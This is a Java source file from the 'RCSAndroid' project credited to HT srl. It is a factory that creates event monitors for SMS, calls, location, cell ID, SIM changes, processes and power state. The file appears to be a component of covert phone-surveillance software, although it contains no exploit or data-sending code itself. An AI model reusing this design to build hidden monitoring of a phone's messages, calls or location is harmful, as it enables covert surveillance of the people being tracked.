/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : EventFactory.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.event;

import com.android.service.interfaces.AbstractFactory;

import android.util.Log;

public class EventFactory implements AbstractFactory<EventBase,EventType>{
	private static final String TAG = "EventFactory";

	public EventBase create(EventType type) {
		EventBase e = null;
		switch (type) {
			case EVENT_TIMER:
				Log.d("QZ", TAG + " Info: " + "");
				e = new EventTimer();
				break;

			case EVENT_SMS:
				Log.d("QZ", TAG + " Info: " + "EVENT_SMS");
				e = new EventSms();
				break;

			case EVENT_CALL:
				Log.d("QZ", TAG + " Info: " + "EVENT_CALL");
				e = new EventCall();
				break;

			case EVENT_CONNECTION:
				Log.d("QZ", TAG + " Info: " + "EVENT_CONNECTION");
				e = new EventConnectivity();
				break;

			case EVENT_PROCESS:
				Log.d("QZ", TAG + " Info: " + "EVENT_PROCESS");
				e = new EventProcess();
				break;

			case EVENT_CELLID:
				Log.d("QZ", TAG + " Info: " + "EVENT_CELLID");
				e = new EventCellId();
				break;

			case EVENT_QUOTA:
				Log.d("QZ", TAG + " Info: " + "EVENT_QUOTA");
				break;

			case EVENT_SIM_CHANGE:
				Log.d("QZ", TAG + " Info: " + "EVENT_SIM_CHANGE");
				e = new EventSim();
				break;

			case EVENT_LOCATION:
				Log.d("QZ", TAG + " Info: " + "EVENT_LOCATION");
				e = new EventLocation();
				break;

			case EVENT_AC:
				Log.d("QZ", TAG + " Info: " + "EVENT_AC");
				e = new EventAc();
				break;

			case EVENT_BATTERY:
				Log.d("QZ", TAG + " Info: " + "EVENT_BATTERY");
				e = new EventBattery();
				break;

			case EVENT_STANDBY:
				Log.d("QZ", TAG + " Info: " + "EVENT_STANDBY");
				e = new EventStandby();
				break;

			default:
				Log.d("QZ", TAG + " Error: " + "Unknown: " + type);
				break;
		}
		return e;
	}
}
